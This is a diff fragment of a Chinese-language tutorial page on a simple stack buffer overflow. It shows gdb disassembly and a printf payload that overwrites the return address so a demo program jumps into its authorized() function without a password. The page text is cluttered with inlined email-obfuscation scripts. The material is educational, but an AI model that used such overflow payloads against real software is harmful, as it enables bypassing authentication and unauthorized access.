+  0x00000000004006dd &lt;+45&gt;: call   0x400580 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4a393e3829273a0a3a263e">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
   0x00000000004006e2 &lt;+50&gt;: test   eax,eax
   0x00000000004006e4 &lt;+52&gt;: jne    0x4006f0 &lt;getInput+64&gt;
   0x00000000004006e6 &lt;+54&gt;: mov    eax,0x0
@@ -383,7 +383,7 @@ Dump of assembler code for function authorized:
 0x00000000004006a0 &lt;+0&gt;:   push   rbp
 0x00000000004006a1 &lt;+1&gt;:  mov    rbp,rsp
 0x00000000004006a4 &lt;+4&gt;:  mov    edi,0x4007e2
-0x00000000004006a9 &lt;+9&gt;:  call   0x400550 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="572722232417273b23">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
+0x00000000004006a9 &lt;+9&gt;:  call   0x400550 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="572722232417273b23">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;
 0x00000000004006ae &lt;+14&gt;: pop    rbp
 0x00000000004006af &lt;+15&gt;: ret
 End of assembler dump.
@@ -398,7 +398,7 @@ printf "aaaaaaaaaaaaaaaaaaaaaaa\x00\xa0\x06\x40\x00\x00\x00\x00\x00" | ./overflo
 <p>这有16个a，还有7个空字符（<code>\x00</code>）来覆盖rbp，最后，我们用我们的目标地址覆盖了正常时的返回地址。如果我们运行它的话，程序将会触发漏洞，直接跑到authorized()里。尽管我们还没输啥对的密码。</p>
 
 <pre><code>#!bash
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ec8f9e859fac9f9c898f989e99818598c18f9e859f">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> ~/D/p/overflow&gt; printf "aaaaaaaaaaaaaaaaaaaaaaa\x00\xa0\x06\x40\x00\x00\x00\x00\x00" |
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ec8f9e859fac9f9c898f989e99818598c18f9e859f">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> ~/D/p/overflow&gt; printf "aaaaaaaaaaaaaaaaaaaaaaa\x00\xa0\x06\x40\x00\x00\x00\x00\x00" |
  ./overflow
 You rascal you!
 fish: Process 9299, “./overflow” from job 1, “printf "aaaaaaaaaaaaaaaaaaaaaaa\x00\xa0\x06\x40\x00\x00\x00
@@ -409,14 +409,14 @@ fish: Process 9299, “./overflow” from job 1, “printf "aaaaaaaaaaaaaaaaaaaa
 
 <h2>0x02 总结</h2>
 
-<hr />
+<hr>
 
 <p>这就是啦！一个简单的缓冲区溢出，如果你知道这是怎么发生的话，你会觉得这个太牛逼太好玩了，只要栈上数据仍然可执行，你就可以把代码扔到栈上的一个缓冲区里面，比如这样，然后把返回地址指向缓冲区，这样就能用该进程的权限执行你自个儿的代码了。这已经不可能了（注：作者估计是指一些较新的系统已经禁止栈上数据的执行权限了），但是还是可以修改函数的返回地址，这还是同样给力。</p>
 
 <p>一些其他给想要学习的人的连接（英文，作者给的）： 
 <a href="http://insecure.org/stf/smashstack.html">http://insecure.org/stf/smashstack.html</a> 
 <a href="http://www.eecis.udel.edu/~bmiller/cis459/2007s/readings/buff-overflow.html">http://www.eecis.udel.edu/~bmiller/cis459/2007s/readings/buff-overflow.html</a> <a href="https://developer.apple.com/library/mac/#documentation/security/conceptual/SecureCodingGuide/Articles/BufferOverflows.html">https://developer.apple.com/library/mac/#documentation/security/conceptual/SecureCodingGuide/Articles/BufferOverflows.html</a> 
-<a href="http://www.ibm.com/developerworks/library/l-sp4/index.html">http://www.ibm.com/developerworks/library/l-sp4/index.html</a></p>      </p>
+<a href="http://www.ibm.com/developerworks/library/l-sp4/index.html">http://www.ibm.com/developerworks/library/l-sp4/index.html</a></p>      <p></p>
     
 			</body>
 		</html>
